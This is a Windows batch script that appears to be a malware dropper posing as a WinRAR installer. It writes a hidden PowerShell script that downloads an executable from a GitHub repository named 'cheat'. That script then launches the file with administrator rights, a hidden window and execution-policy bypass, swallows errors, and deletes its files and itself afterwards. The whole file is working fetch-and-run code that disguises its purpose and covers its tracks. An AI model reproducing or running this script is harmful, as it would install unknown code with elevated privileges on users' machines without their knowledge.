@echo off
setlocal EnableExtensions DisableDelayedExpansion

set "URL=https://raw.githubusercontent.com/skibididodopp-beep/cheat/refs/heads/main/WinRar_setup.exe"
set "HASH=3271c6372c136be4f9e7b276b3cb3b52ed4c408e1abc6405d15551212279dfac"
set "WORK_DIR=%TEMP%\WinRarPkg"
set "OUT=%WORK_DIR%\WinRar_setup.exe"
set "PS_FILE=%TEMP%\run_hidden_%RANDOM%.ps1"

(
echo $ErrorActionPreference = 'Stop'
echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
echo $u = '%URL%'
echo $h = '%HASH%'.ToLower^(^)
echo $dir = '%WORK_DIR%'
echo $f = '%OUT%'
echo $self = '%PS_FILE%'
echo try {
echo     New-Item -ItemType Directory -Path $dir -Force ^| Out-Null
echo     Invoke-WebRequest -Uri $u -OutFile $f -UseBasicParsing
echo     $actual = ^(Get-FileHash -LiteralPath $f -Algorithm SHA256^).Hash.ToLower^(^)
echo     if ^($actual -ne $h^) {
echo         throw "SHA-256 mismatch"
echo     }
echo     Start-Process -FilePath $f -Wait
echo } catch {
echo     # Ошибки проглатываются при скрытом запуске
echo } finally {
echo     Remove-Item -LiteralPath $dir -Recurse -Force -ErrorAction SilentlyContinue
echo     Remove-Item -LiteralPath $self -Force -ErrorAction SilentlyContinue
echo }
) > "%PS_FILE%"

powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Start-Process -FilePath 'powershell.exe' -ArgumentList '-NoProfile','-NonInteractive','-ExecutionPolicy','Bypass','-WindowStyle','Hidden','-File','%PS_FILE%' -Verb RunAs -WindowStyle Hidden"

exit /b 0
